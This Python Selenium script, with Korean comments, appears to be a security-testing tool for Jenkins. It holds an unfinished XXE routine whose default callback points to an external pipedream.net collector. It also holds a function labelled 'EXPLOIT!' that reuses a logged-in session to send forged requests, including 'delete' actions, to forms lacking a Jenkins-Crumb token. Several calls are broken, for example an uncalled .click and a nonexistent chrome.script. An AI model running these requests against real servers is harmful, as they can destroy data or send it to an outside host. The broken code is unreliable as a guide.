from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.select import Select
import pandas as pd
import requests as req
from src.func import *

#@ todo xxe 추가해야함
def xxe_on_build_after_option(chrome, url, port, path, response_server="https://eozqaulxtdlixhg.m.pipedream.net/xxe"):
    target = f"http://{url}:{port}/{path}"
    chrome.get(target)
    chrome.script("window.scrollTo(0,document.body.scrollHeight)")
    #최 하단으로 스크롤 내림 그래야 클릭해줌
    build_menu = chrome.find_element(By.XPATH, '//*[@id="yui-gen57-button"]').get_attribute()

    for itm in build_menu:
        print(f"--------------------------빌드 옵션 = {itm}----------------------------")
        chrome.find_element(By.XPATH,f'//*[@id="yui-gen57-button"]/option[text()="{itm}"]').click
        # 빌드 후 조치 클릭

        chrome.find_element(By.XPATH, f'//*[@id="yui-gen114-button"]/option[text()="{itm}"]').click
        break
    #//*[@id="yui-gen55-button"] => 드롭다운 메뉴버튼


def Csrf_protection_check(chrome, url, port, id, pw, path, action, value, value_type):
    try:
        uri = f"http://{url}:{port}{path}"
        chrome.get(uri)
        print("접속 시도")
        login(chrome,id,pw,"not first")
        sleep(1)
    except:
        print("접속중.....")

    try:
        info = []
        with open("user_info.txt", "r") as user:
            info = user.readlines()

    except:
        print("유저 에이전트 정보를 위한 파일이 필요합니다. user_info.txt에 구글에 my user agent를 쳐서 나온 값을 넣어 주세요")

    user_agent = info[0]

    #EXPLOIT!
    if value=="input":
        if "name" in value_type:
            key= value_type[6:]
            value = "delete"

    else:
        key, value = "submit", "wawawawawawa"

    not_valid_key = ['Jenkins-Crumb']

    if key not in not_valid_key:
    #세션을 가져옴
        session = get_session(chrome, user_agent)
        payload = action
        if "http" not in payload:
            payload = uri+payload
        exploit_data = {key:value}

        #파라미터 날려보고 response 받음, 근데 delete같이 페이지를 삭제하면 404떠서 dummy값 날림
        response = session.get(payload+'/', params=exploit_data)
        sleep(1)

        return key, value, response

    else:
        print("Skip")
        return 0,0,0

